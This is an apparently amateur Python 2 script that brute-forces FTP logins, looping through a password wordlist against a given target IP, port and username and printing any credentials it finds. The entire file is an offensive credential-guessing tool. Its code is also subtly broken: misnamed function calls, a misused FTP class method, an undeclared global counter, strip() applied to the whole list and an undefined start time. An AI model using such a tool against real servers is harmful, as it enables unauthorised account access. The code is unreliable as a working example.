import sys
import argparse
import datetime
from ftplib import FTP
from word_list_generator import check_file
from word_list_generator import generate

count = 0

info = '''
Usage: ./ftp_brute_force.py [options]\n
Options: -t, --target    <ip>        |   Target\n
         -u, --user      <username>  |   User\n
         -p, --port      <port>      |   Port\n

Example: ./ftp_brute_force.py -t 192.168.1.1 -u bob -p 21
'''

def help():
    print info
    sys.exit(0)

def attempt_login(target, port, username, password):
    try:
        ftp = FTP.connect(target, port)
        ftp.login(username, password)
        ftp.quit()
        print '[!!] Credentials Discovered'
        print '[!!] Username: ', username
        print '[!!] Password: ', password
        count += 1
        return
    except:
        pass


def brute_force(target, username, port):
    wordlist = open('BruteForceList.txt', 'r')
    passwords = wordlist.readlines()
    for passwd in passwords:
        passwd = passwords.strip()
        attempt_login(target, port, username, passwd)
        if count >0:
            break
        
    


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-p", "--port")

args = parser.parse_args()

if not args.target or not args.username or not args.port:
    help()

target = args.target
username = args.username
port = args.port


fileExists = checkFile()
if not fileExists:
    print 'Generating wordlist...'
    start =  datetime.datetime.now()
    print 'Start time: ', start
    Generate()
    end =  datetime.datetime.now()
    print 'Wordlist complete...'
    print 'End time: ', end


scriptStart =  datetime.datetime.now()
print 'Beginning script execution: ', scriptStart

brute_force(target, username, port)

scriptEnd =  datetime.datetime.now()
scriptTime = scriptEnd - scriptStart
totalTime = scriptStart - start

print 'Script Complete: ', scriptEnd
print 'Script Runtime: ', scriptTime
print 'Total Runtime: ', totalTime

sys.exit(0)



